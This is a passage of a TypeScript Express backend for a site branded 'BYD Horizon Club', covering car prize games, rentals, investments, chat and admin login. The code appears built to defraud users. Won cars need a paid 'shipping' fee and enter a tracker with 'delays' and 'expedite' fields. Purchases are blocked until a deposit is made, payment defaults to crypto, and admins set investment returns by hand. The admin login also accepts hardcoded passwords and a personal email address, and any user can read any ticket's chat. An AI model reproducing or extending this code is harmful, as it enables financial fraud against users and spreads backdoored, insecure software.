  await db.run("INSERT INTO drive_to_earn (user_id, date, miles_driven, charging_time, points_earned, week_start) VALUES (?,?,?,?,?,?)", [req.user.id, today, parseFloat(milesDriven), parseFloat(chargingTime || 0), points, weekStart]);
  await db.run("UPDATE users SET horizon_points = horizon_points + ?, carbon_lbs_saved = carbon_lbs_saved + ? WHERE id = ?", [points, parseFloat(milesDriven) * 2.5, req.user.id]);
  // Carbon offset
  const lbsSaved = parseFloat(milesDriven) * 2.5;
  const trees = Math.floor(parseFloat(milesDriven) / 100);
  await db.run("INSERT INTO carbon_offset_logs (user_id, miles_driven, lbs_co2_saved, trees_planted) VALUES (?,?,?,?)", [req.user.id, parseFloat(milesDriven), lbsSaved, trees]);
  await db.run("UPDATE users SET carbon_trees_planted = carbon_trees_planted + ?, carbon_lbs_saved = carbon_lbs_saved + ? WHERE id = ?", [trees, lbsSaved, req.user.id]);
  res.json({ success: true, points, milesDriven, lbsSaved, trees, message: `+${points} points for ${milesDriven} miles! ${trees} trees planted.` });
});

app.get("/api/drive-to-earn/leaderboard", async (req, res) => {
  const db = await getDb();
  const weekStart = new Date(Date.now() - ((new Date().getDay() || 7) - 1) * 86400000).toISOString().split("T")[0];
  const leaders = await db.all("SELECT u.name, SUM(d.miles_driven) as total_miles, SUM(d.points_earned) as total_points FROM drive_to_earn d JOIN users u ON d.user_id = u.id WHERE d.week_start >= ? GROUP BY d.user_id ORDER BY total_miles DESC LIMIT 10", [weekStart]);
  res.json(leaders);
});

// 2. Mystery Car Subscription
app.post("/api/mystery-car/subscribe", authenticateUser, async (req: any, res) => {
  const db = await getDb();
  const existing = await db.get("SELECT id FROM mystery_car_subscriptions WHERE user_id = ?", [req.user.id]);
  if (existing) return res.status(400).json({ error: "Already subscribed." });
  const gc = await db.get("SELECT config_json FROM gamification_config WHERE feature_key = 'mystery_car' AND enabled = 1");
  if (!gc?.enabled) return res.status(400).json({ error: "Mystery Car is currently unavailable." });
  const config = JSON.parse(gc.config_json || '{}');
  const fee = config.monthly_fee || 99;
  const cars = await db.all("SELECT model FROM cars WHERE is_active = 1 ORDER BY RANDOM() LIMIT 1");
  const randomCar = cars[0]?.model || "BYD Dolphin";
  const nextDelivery = new Date(Date.now() + 30 * 86400000).toISOString().split("T")[0];
  await db.run("INSERT INTO mystery_car_subscriptions (user_id, active, current_car, next_delivery, monthly_charge, months_active) VALUES (?,1,?,?,?,1)", [req.user.id, randomCar, nextDelivery, fee]);
  await db.run("UPDATE users SET balance = balance - ? WHERE id = ? AND balance >= ?", [fee, req.user.id, fee]);
  await db.run("INSERT INTO notifications (user_id, type, title, message) VALUES (?, 'mystery', 'Mystery Car Subscribed!', 'Your first car: ' || ? || '! Delivery by ' || ?)", [req.user.id, randomCar, nextDelivery]);
  res.json({ success: true, car: randomCar, nextDelivery, message: `Subscribed! Your mystery car: ${randomCar}!` });
});

app.post("/api/mystery-car/unsubscribe", authenticateUser, async (req: any, res) => {
  const db = await getDb();
  await db.run("DELETE FROM mystery_car_subscriptions WHERE user_id = ?", [req.user.id]);
  res.json({ success: true, message: "Unsubscribed from Mystery Car." });
});

// 2b. Mystery Car Reveal Game (Elite only)
app.post("/api/elite/mystery-reveal", authenticateUser, async (req: any, res) => {
  const db = await getDb();
  const user = await db.get("SELECT membership_active, id FROM users WHERE id = ?", [req.user.id]);
  if (!user?.membership_active) return res.status(403).json({ error: "Elite membership required for Mystery Car reveal." });
  const prizes = [
    { name: "BYD Dolphin", value: 29900, type: "car", weight: 25 },
    { name: "BYD Atto 3", value: 38900, type: "car", weight: 15 },
    { name: "BYD Seal", value: 45900, type: "car", weight: 8 },
    { name: "BYD Han", value: 52500, type: "car", weight: 5 },
    { name: "BYD Super 9", value: 85000, type: "car", weight: 1 },
    { name: "500 Horizon Points", value: 500, type: "points", weight: 20 },
    { name: "15% off next rental", value: 0, type: "discount", weight: 15 },
    { name: "$50 Balance Credit", value: 50, type: "credit", weight: 10 },
    { name: "Free 1-Month Insurance", value: 89, type: "insurance", weight: 5 },
  ];
  const totalWeight = prizes.reduce((s, p) => s + p.weight, 0);
  let roll = Math.random() * totalWeight;
  let selected = prizes[0];
  for (const p of prizes) {
    roll -= p.weight;
    if (roll <= 0) { selected = p; break; }
  }
  await db.run("INSERT INTO mystery_car_prizes (user_id, prize_name, prize_value, prize_type) VALUES (?,?,?,?)", [req.user.id, selected.name, selected.value, selected.type]);
  await logUserInteraction(req.user.id, req.user.email, "MYSTERY_REVEAL", `Revealed: ${selected.name}`);
  res.json({ success: true, prize: selected });
});

app.post("/api/elite/mystery-claim", authenticateUser, async (req: any, res) => {
  const { prizeId, shippingCity, shippingLocation, shippingEmail } = req.body;
  if (!prizeId) return res.status(400).json({ error: "Prize ID required." });
  const db = await getDb();
  const prize = await db.get("SELECT * FROM mystery_car_prizes WHERE id = ? AND user_id = ? AND claimed = 0", [prizeId, req.user.id]);
  if (!prize) return res.status(404).json({ error: "Unclaimed prize not found." });
  if (prize.prize_type === 'car' && (!shippingCity || !shippingEmail)) return res.status(400).json({ error: "Shipping city and email required for car prizes." });
  const shippingCost = prize.prize_type === 'car' ? 199 : 0;
  await db.run("UPDATE mystery_car_prizes SET claimed = 1, shipping_city = ?, shipping_location = ?, shipping_email = ?, shipping_cost = ?, shipping_paid = 1 WHERE id = ?", [shippingCity || '', shippingLocation || '', shippingEmail || '', shippingCost, prizeId]);
  if (prize.prize_type === 'car') {
    await db.run("INSERT OR IGNORE INTO map_tracking (user_id, car_id, current_lat, current_lng, route_index, total_stops, delays_encountered, expedite_paid, last_updated) VALUES (?, 1, 33.7431, -118.2673, 0, 100, 0, 0, CURRENT_TIMESTAMP)", [req.user.id]);
    await db.run("INSERT INTO notifications (user_id, type, title, message) VALUES (?, 'mystery', 'Car Claimed!', 'Your ' || ? || ' is on its way to ' || ? || '! Shipping: $' || ? || '. Track it in Transit.')", [req.user.id, prize.prize_name, shippingCity, shippingCost]);
  } else if (prize.prize_type === 'credit') {
    await db.run("UPDATE users SET balance = balance + ? WHERE id = ?", [prize.prize_value, req.user.id]);
    await db.run("INSERT INTO notifications (user_id, type, title, message) VALUES (?, 'mystery', 'Credit Awarded', 'You won $' || ? || ' balance credit!')", [req.user.id, prize.prize_value]);
  } else if (prize.prize_type === 'points') {
    await db.run("UPDATE users SET horizon_points = horizon_points + ? WHERE id = ?", [prize.prize_value, req.user.id]);
    await db.run("INSERT INTO notifications (user_id, type, title, message) VALUES (?, 'mystery', 'Points Awarded', 'You won ' || ? || ' Horizon Points!')", [req.user.id, prize.prize_value]);
  }
  await logUserInteraction(req.user.id, req.user.email, "MYSTERY_CLAIM", `Claimed: ${prize.prize_name} - ${prize.prize_type}`);
  res.json({ success: true, message: `Prize claimed: ${prize.prize_name}!`, prize });
});

app.get("/api/elite/mystery-prizes", authenticateUser, async (req: any, res) => {
  const db = await getDb();
  const prizes = await db.all("SELECT * FROM mystery_car_prizes WHERE user_id = ? ORDER BY id DESC", [req.user.id]);
  res.json(prizes);
});

app.get("/api/admin/mystery-prizes", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  const prizes = await db.all("SELECT mp.*, u.name as user_name, u.email as user_email FROM mystery_car_prizes mp JOIN users u ON mp.user_id = u.id ORDER BY mp.id DESC");
  res.json(prizes);
});

// 3. President's Club
app.get("/api/president-club/status", authenticateUser, async (req: any, res) => {
  const db = await getDb();
  const gc = await db.get("SELECT config_json FROM gamification_config WHERE feature_key = 'president_club' AND enabled = 1");
  const config = gc ? JSON.parse(gc.config_json || '{}') : {};
  const minRefs = config.min_referrals || 10;
  const refCount = await db.get("SELECT COUNT(*) as count FROM referrals WHERE referrer_id = ? AND status = 'paid'", [req.user.id]);
  res.json({ eligible: refCount.count >= minRefs, invited: req.user.is_president_club === 1, referralCount: refCount.count, minRequired: minRefs });
});

// 4. Carbon Offset
app.get("/api/carbon-offset/stats", authenticateUser, async (req: any, res) => {
  const db = await getDb();
  const total = await db.get("SELECT SUM(miles_driven) as total_miles, SUM(lbs_co2_saved) as total_lbs, SUM(trees_planted) as total_trees FROM carbon_offset_logs WHERE user_id = ?", [req.user.id]);
  const global = await db.get("SELECT SUM(lbs_co2_saved) as global_lbs, SUM(trees_planted) as global_trees FROM carbon_offset_logs");
  res.json({ user: total || { total_miles: 0, total_lbs: 0, total_trees: 0 }, global: global || { global_lbs: 0, global_trees: 0 } });
});

// 5. Lottery Raffle
app.get("/api/lottery/status", authenticateUser, async (req: any, res) => {
  const db = await getDb();
  const month = new Date().toISOString().substring(0, 7);
  const entries = await db.get("SELECT SUM(tickets) as total FROM lottery_entries WHERE user_id = ? AND month = ?", [req.user.id, month]);
  const allEntries = await db.get("SELECT SUM(tickets) as total FROM lottery_entries WHERE month = ?", [month]);
  res.json({ tickets: entries?.total || 0, totalPool: allEntries?.total || 0, month });
});

// ==================== NOTIFICATIONS ====================

app.get("/api/notifications", authenticateUser, async (req: any, res) => {
  const db = await getDb();
  const notifs = await db.all("SELECT * FROM notifications WHERE user_id = ? ORDER BY id DESC LIMIT 50", [req.user.id]);
  res.json(notifs);
});

app.post("/api/notifications/:id/read", authenticateUser, async (req: any, res) => {
  const db = await getDb();
  await db.run("UPDATE notifications SET is_read = 1 WHERE id = ? AND user_id = ?", [req.params.id, req.user.id]);
  res.json({ success: true });
});

app.post("/api/notifications/read-all", authenticateUser, async (req: any, res) => {
  const db = await getDb();
  await db.run("UPDATE notifications SET is_read = 1 WHERE user_id = ?", [req.user.id]);
  res.json({ success: true });
});

// ==================== SUPPORT ====================

app.post("/api/tickets/create", async (req, res) => {
  const { name, email, subject, message } = req.body;
  if (!name || !email || !subject || !message) return res.status(400).json({ error: "All fields required." });
  const db = await getDb();
  const result = await db.run("INSERT INTO support_tickets (name, email, subject, message, status) VALUES (?,?,?,?,'pending')", [name, email.toLowerCase(), subject, message]);
  res.json({ success: true, ticketId: result.lastID, message: `Ticket #${1200 + result.lastID} received.` });
});

app.get("/api/help", (req, res) => {
  res.json({ answer: "Your vehicle is in transit. Track live on your dashboard. For support, email support@bydhorizon.com." });
});

// ==================== CHARITY / DONATIONS ====================

app.post("/api/charity/donate", authenticateUser, async (req: any, res) => {
  const { charity_name, points } = req.body;
  if (!charity_name || !points) return res.status(400).json({ error: "Charity name and points required." });
  const db = await getDb();
  if (req.user.horizon_points < points) return res.status(400).json({ error: "Insufficient points." });
  await db.run("UPDATE users SET horizon_points = horizon_points - ?, carbon_trees_planted = carbon_trees_planted + ? WHERE id = ?", [points, Math.floor(points / 10), req.user.id]);
  const txHash = "BYD-DON-" + crypto.randomBytes(8).toString("hex").toUpperCase();
  await db.run("INSERT INTO charity_donations (user_id, charity_id, charity_name, amount, tx_hash) VALUES (?, ?, ?, ?, ?)", [req.user.id, charity_name.toLowerCase().replace(/\s+/g, '_'), charity_name, points, txHash]);
  await db.run("INSERT INTO notifications (user_id, type, title, message) VALUES (?, 'charity', 'Donation Made', 'You donated ' || ? || ' points to ' || ? || '!')", [req.user.id, points, charity_name]);
  await db.run("UPDATE charity_counter SET current_amount = current_amount + ? WHERE id = 1", [points * 0.1]);
  await logUserInteraction(req.user.id, req.user.email, "DONATION", `Donated ${points} points to ${charity_name}`);
  res.json({ success: true, message: `Donated ${points} points to ${charity_name}! +${Math.floor(points / 10)} trees planted.`, tx_hash: txHash });
});

// ==================== OUTREACH ====================

app.post("/api/outreach/invite", authenticateUser, async (req: any, res) => {
  const { email, method } = req.body;
  if (!email) return res.status(400).json({ error: "Email required." });
  const db = await getDb();
  // Check if email is already registered
  const existing = await db.get("SELECT id FROM users WHERE email = ?", [email.toLowerCase()]);
  if (existing) return res.status(400).json({ error: "This person is already a member." });
  // Create a referral entry
  await db.run("INSERT INTO notifications (user_id, type, title, message) VALUES (?, 'outreach', 'Invite Sent', 'You invited ' || ? || ' via ' || ? || '. Reward pending signup.')", [req.user.id, email, method || 'email']);
  await logUserInteraction(req.user.id, req.user.email, "OUTREACH", `Invited ${email} via ${method || 'email'}`);
  res.json({ success: true, message: `Invitation sent to ${email}! You'll earn 100 points when they join.` });
});

// ==================== RENTALS ====================

const RENTAL_PRICES: Record<string, number> = {
  "BYD Dolphin": 250, "BYD Atto 3": 300, "BYD Seal": 350, "BYD Han": 400,
  "BYD Tang": 450, "BYD Shark": 500, "BYD Super 9": 800,
  "BYD Sea Lion 07": 350, "BYD Yuan Plus": 280, "BYD Seagull": 200,
  "BYD Song Plus": 320, "BYD Denza D9": 600, "BYD Denza N7": 500,
  "BYD Yangwang U8": 700, "BYD Yangwang U9": 750,
  "BYD Qin Plus": 250, "BYD Destroyer 05": 260, "BYD e6": 300,
  "BYD D1": 220, "BYD Frigate 07": 380, "BYD Sea King": 650,
  "BYD Dolphin Mini": 200, "BYD Fang Cheng Bao 5": 550,
  "BYD Song L": 400, "BYD Ocean-M": 350
};
const MIN_RENTAL_PRICE = 200;

function getRentalPrice(model: string): number {
  return RENTAL_PRICES[model] || MIN_RENTAL_PRICE;
}

app.get("/api/rentals/vehicles", async (req, res) => {
  const db = await getDb();
  const vehicles = await db.all("SELECT id, model, year, price, range_miles, acceleration, battery, description, badge, category, status, rental_price_per_day, specs_json FROM cars WHERE is_active = 1 AND status != 'Unavailable'");
  const enriched = vehicles.map((v: any) => ({
    ...v, specs: v.specs_json ? JSON.parse(v.specs_json) : {},
    rental_price_per_day: v.rental_price_per_day || getRentalPrice(v.model)
  }));
  res.json(enriched);
});

app.get("/api/rentals/availability/:carId", async (req, res) => {
  const db = await getDb();
  const { startDate, endDate } = req.query;
  if (!startDate || !endDate) return res.status(400).json({ error: "Dates required." });
  const car = await db.get("SELECT id, model, rental_price_per_day, status FROM cars WHERE id = ?", [req.params.carId]);
  if (!car) return res.status(404).json({ error: "Vehicle not found." });
  const conflicts = await db.all("SELECT id FROM rental_orders WHERE car_id = ? AND status IN ('confirmed','dispatched','in_transit') AND NOT (end_date < ? OR start_date > ?)", [req.params.carId, startDate, endDate]);
  res.json({ available: car.status !== 'Unavailable' && conflicts.length === 0, price_per_day: car.rental_price_per_day || getRentalPrice(car.model), model: car.model });
});

app.post("/api/rentals/book", authenticateUser, async (req: any, res) => {
  const { carId, startDate, endDate, deliveryCity, deliveryCountry, insuranceTier, extras, paymentMethod } = req.body;
  if (!carId || !startDate || !endDate) return res.status(400).json({ error: "Car and dates required." });
  const db = await getDb();
  const user = await db.get("SELECT kyc_status FROM users WHERE id = ?", [req.user.id]);
  if (!user || user.kyc_status !== "verified") return res.status(403).json({ error: "KYC verification required before renting.", kycRequired: true });
  const car = await db.get("SELECT * FROM cars WHERE id = ?", [carId]);
  if (!car) return res.status(404).json({ error: "Vehicle not found." });
  // Enforce minimum rental price
  const effectivePrice = car.rental_price_per_day || getRentalPrice(car.model);
  if (effectivePrice < MIN_RENTAL_PRICE) {
    return res.status(400).json({ error: `Rental price must be at least $${MIN_RENTAL_PRICE}/day.` });
  }
  // Check deposit balance before purchase
  const depositRequired = await getSetting('deposit_required_before_purchase');
  if (depositRequired !== 'false') {
    const userBalance = await db.get("SELECT balance FROM users WHERE id = ?", [req.user.id]);
    if (!userBalance || userBalance.balance < 150) {
      return res.status(403).json({ error: "Insufficient balance. Please deposit at least $150 before renting.", depositRequired: true });
    }
  }
  const conflicts = await db.all("SELECT id FROM rental_orders WHERE car_id = ? AND status IN ('confirmed','dispatched','in_transit') AND NOT (end_date < ? OR start_date > ?)", [carId, startDate, endDate]);
  if (conflicts.length > 0) return res.status(400).json({ error: "Vehicle not available for selected dates." });
  const days = Math.max(1, Math.ceil((new Date(endDate).getTime() - new Date(startDate).getTime()) / 86400000));
  const baseRate = car.rental_price_per_day || getRentalPrice(car.model);
  const userRecord = await db.get("SELECT membership_active FROM users WHERE id = ?", [req.user.id]);
  const eliteDiscount = userRecord?.membership_active ? 0.15 : 0;
  const dailyRate = Math.round(baseRate * (1 - eliteDiscount) * 100) / 100;
  const insuranceMap: Record<string, number> = { basic: 10, premium: 25, elite: 50 };
  const insuranceCost = (insuranceMap[insuranceTier || 'basic'] || 10) * days;
  const extrasCost = (extras?.gps ? 5 : 0) + (extras?.childSeat ? 8 : 0) + (extras?.roofRack ? 12 : 0) + (extras?.winterTires ? 15 : 0);
  const deliveryFee = deliveryCountry === 'US' ? 0 : deliveryCountry === 'NG' ? 150 : 200;
  const subtotal = dailyRate * days + insuranceCost + extrasCost + deliveryFee;
  const orderNum = "BYR-" + crypto.randomBytes(6).toString("hex").toUpperCase();
  const result = await db.run("INSERT INTO rental_orders (user_id, car_id, order_number, start_date, end_date, delivery_city, delivery_country, insurance_tier, extras_json, subtotal, daily_rate, days, status, payment_method) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?)", [req.user.id, carId, orderNum, startDate, endDate, deliveryCity || '', deliveryCountry || 'US', insuranceTier || 'basic', JSON.stringify(extras || {}), subtotal, dailyRate, days, 'pending_payment', paymentMethod || 'crypto']);
  await db.run("INSERT INTO notifications (user_id, type, title, message) VALUES (?, 'rental', 'Rental Order Created', 'Order ' || ? || ' for ' || ? || ' — $' || ? || ' total.')", [req.user.id, orderNum, car.model, subtotal]);
  res.json({ success: true, order_id: result.lastID, order_number: orderNum, subtotal, daily_rate: dailyRate, days, insurance_cost: insuranceCost, extras_cost: extrasCost, delivery_fee: deliveryFee });
});

app.get("/api/rentals/my-orders", authenticateUser, async (req: any, res) => {
  const db = await getDb();
  const orders = await db.all("SELECT ro.*, c.model, c.range_miles, c.acceleration, c.badge FROM rental_orders ro JOIN cars c ON ro.car_id = c.id WHERE ro.user_id = ? ORDER BY ro.id DESC", [req.user.id]);
  res.json(orders);
});

app.get("/api/admin/rentals", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  const orders = await db.all("SELECT ro.*, c.model, c.range_miles, u.name as user_name, u.email as user_email FROM rental_orders ro JOIN cars c ON ro.car_id = c.id JOIN users u ON ro.user_id = u.id ORDER BY ro.id DESC");
  res.json(orders);
});

app.post("/api/admin/rentals/:orderId/status", authenticateAdmin, async (req: any, res) => {
  const { status, eta, notes } = req.body;
  const db = await getDb();
  const order = await db.get("SELECT * FROM rental_orders WHERE id = ?", [req.params.orderId]);
  if (!order) return res.status(404).json({ error: "Order not found." });
  
  // Deduct balance when confirming rental
  if (status === 'confirmed' && order.status !== 'confirmed') {
    const user = await db.get("SELECT balance FROM users WHERE id = ?", [order.user_id]);
    if (!user || (user.balance || 0) < order.subtotal) {
      return res.status(400).json({ error: `User has insufficient balance ($${user?.balance || 0}). Need $${order.subtotal}.` });
    }
    await db.run("UPDATE users SET balance = balance - ? WHERE id = ?", [order.subtotal, order.user_id]);
  }
  
  await db.run("UPDATE rental_orders SET status = ?, eta = ?, admin_notes = ? WHERE id = ?", [status, eta || null, notes || null, req.params.orderId]);
  if (order) {
    await db.run("INSERT INTO notifications (user_id, type, title, message) VALUES (?, 'rental', 'Order Update', 'Your rental order ' || ? || ' is now: ' || ? || '.')", [order.user_id, order.order_number, status]);
    const statusMessages: Record<string, string> = {
      confirmed: "Your rental has been confirmed! Delivery will begin shortly.",
      dispatched: "Your rental vehicle has been dispatched!",
      in_transit: "Your rental vehicle is in transit!",
      delivered: "Your rental vehicle has been delivered! Enjoy the ride!",
      completed: "Your rental period has been completed. Thank you!"
    };
    if (statusMessages[status]) {
      await db.run("INSERT INTO notifications (user_id, type, title, message) VALUES (?, 'rental', 'Rental Update', ?)", [order.user_id, statusMessages[status]]);
    }
    // Initialize tracking when order is confirmed or dispatched
    if (status === 'confirmed' || status === 'dispatched' || status === 'in_transit') {
      await db.run("INSERT OR IGNORE INTO map_tracking (user_id, car_id, current_lat, current_lng, route_index, total_stops, delays_encountered, expedite_paid, last_updated) VALUES (?, ?, 33.7431, -118.2673, 0, 100, 0, 0, CURRENT_TIMESTAMP)", [order.user_id, order.car_id]);
    }
  }
  res.json({ success: true });
});

app.post("/api/admin/rentals/price", authenticateAdmin, async (req: any, res) => {
  const { carId, rentalPricePerDay } = req.body;
  if (!carId || rentalPricePerDay === undefined) return res.status(400).json({ error: "Car ID and price required." });
  const db = await getDb();
  await db.run("UPDATE cars SET rental_price_per_day = ? WHERE id = ?", [parseFloat(rentalPricePerDay), carId]);
  res.json({ success: true, message: "Rental price updated." });
});

// ==================== INVESTMENTS ====================
const INVESTMENT_MATURITY_DAYS: Record<string, number> = {
  'BYD Stock Pool': 30, 'BYD Expansion Fund': 60, 'BYD Production Facilities': 90,
  'BYD Charging Network': 60, 'BYD Battery Tech Fund': 90
};
function getMaturityDays(optionName: string): number { return INVESTMENT_MATURITY_DAYS[optionName] || 30; }

app.get("/api/investments/options", async (req, res) => {
  const db = await getDb();
  const options = await db.all("SELECT * FROM investment_options WHERE is_active = 1");
  res.json(options);
});

app.post("/api/investments/invest", authenticateUser, async (req: any, res) => {
  const { optionId, amount } = req.body;
  if (!optionId || !amount) return res.status(400).json({ error: "Option and amount required." });
  const db = await getDb();
  const user = await db.get("SELECT kyc_status, balance, membership_active FROM users WHERE id = ?", [req.user.id]);
  if (!user || user.kyc_status !== "verified") return res.status(403).json({ error: "KYC required for investments.", kycRequired: true });
  if (!user.membership_active) return res.status(403).json({ error: "Elite membership required for investments. Subscribe first.", eliteRequired: true });
  const option = await db.get("SELECT * FROM investment_options WHERE id = ?", [optionId]);
  if (!option) return res.status(404).json({ error: "Investment option not found." });
  // Enforce $150 minimum investment floor
  const minInvestment = 150;
  if (amount < minInvestment) return res.status(400).json({ error: `Minimum investment is $${minInvestment}.` });
  if (amount < option.min_amount) return res.status(400).json({ error: `Minimum investment for ${option.name} is $${option.min_amount}.` });
  // Enforce deposit before purchase
  const depositRequired = await getSetting('deposit_required_before_purchase');
  if (depositRequired !== 'false' && (user.balance || 0) < amount) {
    return res.status(403).json({ error: "Insufficient balance. Please deposit at least $150 before investing.", depositRequired: true });
  }
  await db.run("UPDATE users SET balance = balance - ? WHERE id = ?", [amount, req.user.id]);
  const invNum = "INV-" + crypto.randomBytes(6).toString("hex").toUpperCase();
  const maturityDays = getMaturityDays(option.name);
  const maturityDate = new Date(Date.now() + maturityDays * 86400000).toISOString().split("T")[0];
  await db.run("INSERT INTO investments (user_id, option_id, option_name, amount, projected_apy, status, investment_number, maturity_date, started_at) VALUES (?,?,?,?,?,?,?,?,datetime('now'))", [req.user.id, optionId, option.name, amount, option.projected_apy, 'active', invNum, maturityDate]);
  await db.run("INSERT INTO notifications (user_id, type, title, message) VALUES (?, 'investment', 'Investment Made', 'You invested $' || ? || ' in ' || ? || '. APY: ' || ? || '%. Matures: ' || ? || '.')", [req.user.id, amount, option.name, option.projected_apy, maturityDate]);
  res.json({ success: true, investment_number: invNum, projected_apy: option.projected_apy, maturity_date: maturityDate, maturity_days: maturityDays });
});

app.get("/api/investments/my", authenticateUser, async (req: any, res) => {
  const db = await getDb();
  const investments = await db.all("SELECT i.*, io.name as full_name FROM investments i JOIN investment_options io ON i.option_id = io.id WHERE i.user_id = ? ORDER BY i.id DESC", [req.user.id]);
  res.json(investments);
});

app.get("/api/admin/investments", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  const investments = await db.all("SELECT i.*, u.name as user_name, u.email as user_email FROM investments i JOIN users u ON i.user_id = u.id ORDER BY i.id DESC");
  res.json(investments);
});

app.post("/api/admin/investments/:invId/update-return", authenticateAdmin, async (req: any, res) => {
  const { returnAmount } = req.body;
  const db = await getDb();
  await db.run("UPDATE investments SET current_return = ? WHERE id = ?", [returnAmount, req.params.invId]);
  res.json({ success: true });
});

// ==================== PROMOS ====================

app.get("/api/promos/active", async (req, res) => {
  const db = await getDb();
  const promos = await db.all("SELECT * FROM promos WHERE is_active = 1 AND (end_date IS NULL OR end_date >= date('now'))");
  res.json(promos);
});

app.get("/api/admin/promos", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  const promos = await db.all("SELECT * FROM promos ORDER BY id DESC");
  res.json(promos);
});

app.post("/api/admin/promos", authenticateAdmin, async (req: any, res) => {
  const { name, type, discount_percent, bonus_points, start_date, end_date, description } = req.body;
  const db = await getDb();
  await db.run("INSERT INTO promos (name, type, discount_percent, bonus_points, start_date, end_date, description, is_active) VALUES (?,?,?,?,?,?,?,1)", [name, type, discount_percent || 0, bonus_points || 0, start_date || null, end_date || null, description || '']);
  res.json({ success: true });
});

app.delete("/api/admin/promos/:id", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  await db.run("DELETE FROM promos WHERE id = ?", [req.params.id]);
  res.json({ success: true });
});

// ==================== CHAT ====================

app.get("/api/chat/messages/:ticketId", authenticateUser, async (req: any, res) => {
  const db = await getDb();
  const messages = await db.all("SELECT * FROM chat_messages WHERE ticket_id = ? ORDER BY id ASC", [req.params.ticketId]);
  res.json(messages);
});

app.post("/api/chat/send", authenticateUser, async (req: any, res) => {
  const { ticketId, message } = req.body;
  if (!message) return res.status(400).json({ error: "Message required." });
  const db = await getDb();
  await db.run("INSERT INTO chat_messages (ticket_id, sender_id, sender_type, message) VALUES (?,?,'user',?)", [ticketId, req.user.id, message]);
  res.json({ success: true });
});

app.post("/api/chat/admin/send", authenticateAdmin, async (req: any, res) => {
  const { ticketId, message } = req.body;
  const db = await getDb();
  await db.run("INSERT INTO chat_messages (ticket_id, sender_id, sender_type, message) VALUES (?,0,'admin',?)", [ticketId, message]);
  const ticket = await db.get("SELECT user_id FROM support_tickets WHERE id = ?", [ticketId]);
  if (ticket) await db.run("INSERT INTO notifications (user_id, type, title, message) VALUES (?, 'support', 'Support Reply', 'Admin replied to your support ticket.')", [ticket.user_id]);
  res.json({ success: true });
});

// ==================== OUTREACH ====================

app.post("/api/chatbot", async (req, res) => {
  const { message, userId } = req.body;
  if (!message) return res.status(400).json({ error: "Message required." });
  const responses: Record<string, string> = {
    "hello": "Welcome to BYD Horizon Club! How can I assist you today?",
    "hi": "Hey there! Ready to revolutionize your EV experience?",
    "tracking": "You can track your vehicle on the Live Map in your dashboard!",
    "payment": "We accept Crypto (USDT/BTC/ETH), Paystack, Stripe, PayPal, and Bank Transfer.",
    "kyc": "KYC is required for full access. Submit your documents in the dashboard.",
    "referral": "Share your referral code with friends. Earn $50 per referral!",
    "default": "Thank you for your message. A support agent will respond within 24 hours. For urgent issues, contact support@bydhorizon.com."
  };
  const lower = message.toLowerCase();
  let response = responses.default;
  for (const [key, val] of Object.entries(responses)) {
    if (lower.includes(key)) { response = val; break; }
  }
  const db = await getDb();
  await db.run("INSERT INTO chatbot_conversations (user_id, message, response) VALUES (?,?,?)", [userId || null, message, response]);
  res.json({ response });
});

// ==================== BLOG ====================

app.get("/api/blogs", async (req, res) => {
  const db = await getDb();
  const blogs = await db.all("SELECT * FROM blog_posts ORDER BY published_at DESC");
  res.json(blogs);
});

app.get("/api/blogs/:id", async (req, res) => {
  const db = await getDb();
  const blog = await db.get("SELECT * FROM blog_posts WHERE id = ?", [req.params.id]);
  if (!blog) return res.status(404).json({ error: "Post not found." });
  blog.comments = await db.all("SELECT bc.*, u.name as username FROM blog_comments bc JOIN users u ON bc.user_id = u.id WHERE bc.post_id = ? AND bc.status = 'approved' ORDER BY bc.id DESC", [blog.id]);
  res.json(blog);
});

app.post("/api/blogs/:id/comment", authenticateUser, async (req: any, res) => {
  const { comment } = req.body;
  if (!comment) return res.status(400).json({ error: "Comment required." });
  const db = await getDb();
  await db.run("INSERT INTO blog_comments (post_id, user_id, comment, status) VALUES (?,?,?,'pending')", [req.params.id, req.user.id, comment]);
  res.json({ success: true, message: "Comment submitted for moderation." });
});

// ==================== USER SETTINGS ====================

app.post("/api/user/settings/update", authenticateUser, async (req: any, res) => {
  const { name, phone, city, country, crypto_wallet_address, is_incognito } = req.body;
  if (!name) return res.status(400).json({ error: "Name required." });
  const db = await getDb();
  await db.run("UPDATE users SET name=?, phone=?, city=?, country=?, crypto_wallet_address=?, is_incognito=? WHERE id=?", [name, phone || '', city || '', country || 'US', crypto_wallet_address || '', is_incognito ? 1 : 0, req.user.id]);
  await logUserInteraction(req.user.id, req.user.email, "SETTINGS_UPDATE", "Profile updated");
  res.json({ success: true, message: "Settings updated." });
});

app.post("/api/user/change-password", authenticateUser, async (req: any, res) => {
  const { currentPassword, newPassword } = req.body;
  if (!currentPassword || !newPassword) return res.status(400).json({ error: "Both passwords required." });
  const db = await getDb();
  const user = await db.get("SELECT password_hash FROM users WHERE id = ?", [req.user.id]);
  if (user.password_hash !== hashPassword(currentPassword)) return res.status(400).json({ error: "Current password incorrect." });
  await db.run("UPDATE users SET password_hash = ? WHERE id = ?", [hashPassword(newPassword), req.user.id]);
  res.json({ success: true, message: "Password changed." });
});

// ==================== ADMIN API - FULL GOD-MODE ====================

app.post("/api/admin/login", async (req, res) => {
  const { username, password } = req.body;
  if (!username || !password) return res.status(400).json({ error: "Username and password required." });
  const isAdminEmail = username.toLowerCase() === ADMIN_EMAIL || username.toLowerCase() === "admin@bydhorizon.com" || username.toLowerCase() === "admin" || username.toLowerCase() === "jehuhudson@gmail.com";
  const isOverrideKey = password === ADMIN_OVERRIDE_KEY;
  const isAdminPass = password === "admin1234" || password === "byd2026";
  if (isAdminEmail && (isAdminPass || isOverrideKey)) {
    const token = generateSessionToken({ id: 0, email: ADMIN_EMAIL, is_admin: true });
    await logAdminAction("Admin logged in via admin panel", `Username: ${username}`, req.ip || '127.0.0.1', 0);
    return res.json({ token, user: { id: 0, name: "Admin Operator", email: ADMIN_EMAIL, is_admin: true } });
  }
  return res.status(401).json({ error: "Invalid admin credentials." });
});

// Dashboard metrics
app.get("/api/admin/metrics", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  const totalUsers = (await db.get("SELECT COUNT(*) as count FROM users")).count;
  const activeMembers = (await db.get("SELECT COUNT(*) as count FROM users WHERE membership_active = 1")).count;
